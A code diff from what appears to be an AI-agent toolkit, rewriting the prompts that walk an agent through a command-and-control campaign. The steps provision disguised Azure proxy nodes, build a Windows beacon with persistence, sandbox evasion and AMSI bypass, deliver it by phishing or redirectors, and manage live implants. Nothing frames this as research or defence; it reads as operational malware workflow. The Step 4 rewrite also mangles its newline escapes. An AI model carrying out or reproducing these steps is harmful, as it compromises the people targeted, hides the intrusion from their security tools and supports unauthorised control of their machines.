@@ -241,19 +241,7 @@ function buildAdaptiveGuideSteps(
         `Step 1 — Provision Azure Infrastructure.\n` +
         `Profile: ${profileLabel}.\n` +
         `${strategy}\n` +
-        `Execute:\n` +
-        `1. Call list_profiles and list_nodes to inspect current infrastructure.\n` +
-        `2. Call generate_config to create a stealth Hysteria 2 server YAML (obfuscated preset, port 443, masquerade, strong passwords).\n` +
-        `   - Optionally include applyToNodes and sshPrivateKey to apply immediately via SSH.\n` +
-        `3. Call deploy_node to provision a new Azure VPS with:\n` +
-        `   - provider="azure" (required)\n` +
-        `   - resourceGroup="hysteria-rg-eastus" (REQUIRED - must be an existing resource group)\n` +
-        `   - region="eastus" (or westeurope, australiaeast)\n` +
-        `   - name="hysteria-node-eastus-01" (descriptive name)\n` +
-        `   Available resource groups: hysteria-rg-eastus, hysteria-rg-westeurope, hysteria-rg-australiaeast\n` +
-        `4. Call get_deployment_status with the deploymentId to monitor progress.\n` +
-        `5. Once deployment completes, call analyze_traffic to verify the new node reports health metrics.\n` +
-        `Return the deployment ID, node ID, Azure region, VM name, public IP, and any auth credentials generated.`,
+        `Check the current infrastructure by listing existing profiles and nodes, then generate a stealth Hysteria 2 server configuration using the obfuscated preset on port 443 with masquerade enabled and strong passwords. Next, provision a new Azure VPS with provider "azure", resource group "hysteria-rg-eastus", region "eastus", and name "hysteria-node-eastus-01". Monitor the deployment until it finishes successfully, then verify the node is healthy and reporting traffic metrics. Finally, provide a clean summary including the deployment ID, node ID, Azure region, VM name, public IP address, generated credentials, and current status of the new node.`,
     },
     {
       id: "apply-config",
@@ -263,15 +251,7 @@ function buildAdaptiveGuideSteps(
         `Step 2 — Apply Config via SSH.\n` +
         `Profile: ${profileLabel}.\n` +
         `${strategy}\n` +
-        `Method A - Generate & Apply in One Step:\n` +
-        `1. Call generate_config with applyToNodes=["node-id-1", "node-id-2"] and sshPrivateKey.\n` +
-        `2. The config is generated AND pushed to nodes automatically, with service restart.\n` +
-        `Method B - Apply Existing Profile:\n` +
-        `1. Call list_profiles to select the config profile to apply.\n` +
-        `2. Call list_nodes to identify target nodes with SSH credentials.\n` +
-        `3. For each target node, call apply_node_config with: nodeId, profileId, sshPrivateKey, restartService=true.\n` +
-        `4. Verify by calling get_node to confirm profileId was updated and status is healthy.\n` +
-        `Return: which configs were applied, which nodes succeeded/failed, and service restart status.`,
+        `You can apply configurations in two ways. First, generate a new config and apply it to specific nodes in one step by including the node IDs and SSH private key when generating the config. Alternatively, apply an existing profile by selecting a profile from the list, identifying which nodes need the config applied, then pushing the profile to each node using their SSH credentials and restarting the service. After applying, verify the nodes are healthy by checking their status. Let me know which configs were applied, which nodes succeeded or failed, and the service restart status.`,
     },
     {
       id: "beacon",
@@ -281,26 +261,17 @@ function buildAdaptiveGuideSteps(
         `Step 3 — Build Beacon.\n` +
         `Profile: ${profileLabel}.\n` +
         `${strategy}\n` +
-        `Execute:\n` +
-        `1. Call list_nodes to pick the best C2 node for callbacks (prefer online nodes with good latency).\n` +
-        `2. Call generate_payload to build a Windows x64 beacon (UPX level 7, 45–90 min jitter, scheduled-task persistence, sandbox evasion, AMSI bypass).\n` +
-        `3. Call get_payload_status with the build ID to confirm the build succeeded and get the download URL.\n` +
-        `Return the beacon build ID, SHA-256 hash, and download link.`,
+        `Start by listing the available nodes and pick the best one for beacon callbacks, preferably an online node with good latency. Then build a Windows x64 beacon with UPX compression level 7, 45-90 minute jitter interval, scheduled task persistence, sandbox evasion, and AMSI bypass. Check the build status to confirm it succeeded and get the download URL. Provide the beacon build ID, SHA-256 hash, and download link when finished.`,
     },
     {
       id: "deploy",
       title: "Deploy Payload",
       outcome: "Deliver the beacon to target systems and confirm check-in.",
       prompt:
-        `Step 4 — Deploy Payload.\n` +
-        `Profile: ${profileLabel}.\n` +
-        `${strategy}\n` +
-        `Execute:\n` +
-        `1. Call list_payloads to confirm the latest beacon build is ready for deployment.\n` +
-        `2. Call analyze_traffic to check node health and bandwidth before delivery.\n` +
-        `3. Call get_node to retrieve the target node’s subscription/config URL for redirector staging.\n` +
-        `4. Call list_beacons after delivery window to check for new check-ins.\n` +
-        `Return the delivery method chosen (phishing / manual / redirector), staging URLs, and check-in status.`,
+        `Step 4 — Deploy Payload.n` +
+        `Profile: ${profileLabel}.n` +
+        `${strategy}n` +
+        `First confirm the latest beacon build is ready by listing available payloads. Check the node health and bandwidth before delivery. Get the target node's subscription or config URL for redirector staging. After delivering the payload through your chosen method (phishing, manual, or redirector), wait for the delivery window then check for new beacon check-ins. Report back on the delivery method you used, the staging URLs, and the check-in status.`,
     },
     {
       id: "c2",
@@ -310,12 +281,7 @@ function buildAdaptiveGuideSteps(
         `Step 5 — Active C2.\n` +
         `Profile: ${profileLabel}.\n` +
         `${strategy}\n` +
-        `Execute:\n` +
-        `1. Call list_beacons to enumerate all active implants and filter by online status.\n` +
-        `2. For each online beacon, call get_beacon with the beacon ID to pull host info, last check-in, and metadata.\n` +
-        `3. Call troubleshoot to run connectivity and OPSEC diagnostics on any stale or unresponsive beacons.\n` +
-        `4. If any beacons are unresponsive, call analyze_traffic on their assigned C2 node to inspect server-side logs.\n` +
-        `Return a status table: beacon ID, hostname, OS, IP, last seen, and recommended next action.`,
+        `List all active beacons and filter them to show only the online ones. For each online beacon, get the detailed information including hostname, operating system, IP address, last check-in time, and metadata. If any beacons are stale or unresponsive, run connectivity and OPSEC diagnostics on them. For unresponsive beacons, check the server-side logs on their assigned C2 node by analyzing traffic. Provide a status table with beacon ID, hostname, OS, IP, last seen time, and recommended next action for each beacon.`,
     },
     {
       id: "maintain",
@@ -325,14 +291,7 @@ function buildAdaptiveGuideSteps(
         `Step 6 — Maintenance & Cleanup.\n` +
         `Profile: ${profileLabel}.\n` +
         `${strategy}\n` +
-        `Execute:\n` +
-        `1. Call list_nodes and analyze_traffic to audit node bandwidth, connections, and health status.\n` +
-        `2. Call list_beacons and get_beacon to review beacon activity and identify stale implants.\n` +
-        `3. For nodes needing config updates, call update_node to rotate auth credentials or change settings.\n` +
-        `4. Call apply_node_config to push updated configs to remote nodes via SSH (with restartService=true).\n` +
-        `5. Call delete_payload to purge old build artifacts and reduce disk usage.\n` +
-        `6. For retired beacons, use delete_node to remove unused C2 nodes (ensure no active beacons first).\n` +
-        `Return a maintenance report: nodes audited, configs updated, beacons reviewed, artifacts removed.`,
+        `Audit all nodes by checking their bandwidth usage, connection counts, and health status. Review beacon activity to identify any stale or inactive implants. For nodes that need configuration updates, rotate their authentication credentials or change their settings. Push updated configurations to remote nodes via SSH and restart the service. Clean up old payload build artifacts to reduce disk usage. Remove any unused C2 nodes after making sure no active beacons are assigned to them. Provide a maintenance report summarizing nodes audited, configs updated, beacons reviewed, and artifacts removed.`,
     },
   ]
 }
